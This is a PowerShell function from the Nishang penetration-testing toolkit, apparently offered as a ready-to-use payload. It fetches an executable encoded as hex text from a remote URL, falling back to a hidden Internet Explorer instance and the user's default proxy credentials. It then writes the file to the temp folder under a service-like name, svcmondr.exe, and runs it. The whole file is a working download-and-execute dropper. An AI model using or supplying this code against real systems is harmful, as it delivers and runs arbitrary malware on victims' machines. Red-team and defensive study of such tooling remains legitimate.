
function Download_Execute
{
<#
.SYNOPSIS
Nishang Payload to download an executable in text format, convert it to executable and execute.

.DESCRIPTION
This payload downloads an executable in text format, converts it to executable and execute.
Use exetotext.ps1 script to change an executable to text

.PARAMETER URL
The URL from where the file would be downloaded.

.EXAMPLE
PS > Download_Execute http://example.com/file.txt

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL
    )

    $webclient = New-Object System.Net.WebClient    
    #Try to use Default Proxy and Credentials
    #http://stackoverflow.com/questions/14263359/access-web-using-powershell-and-proxy
    $webclient.Headers.Add("User-Agent","Mozilla/4.0+")        
    $webclient.Proxy = [System.Net.WebRequest]::DefaultWebProxy
    $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    
    #Check if the script could access the URL
    #http://stackoverflow.com/questions/23221390/how-to-catch-specific-start-bitstransfer-proxy-authentication-is-required-exce/23304345#23304345
    $ProxyAuth = $webclient.Proxy.IsBypassed($URL)
    if($ProxyAuth)
    {
        [string]$hexformat = $webClient.DownloadString($URL) 
    }
    else
    {
        $webClient = New-Object -ComObject InternetExplorer.Application
        $webClient.Visible = $false
        $webClient.Navigate($URL)
        while($webClient.ReadyState -ne 4) { Start-Sleep -Milliseconds 100 }
        [string]$hexformat = $webClient.Document.Body.innerText
        $webClient.Quit()
    }
    [Byte[]] $temp = $hexformat -split ' '
    [System.IO.File]::WriteAllBytes("$env:temp\svcmondr.exe", $temp)
    Start-Process -NoNewWindow "$env:temp\svcmondr.exe"
}


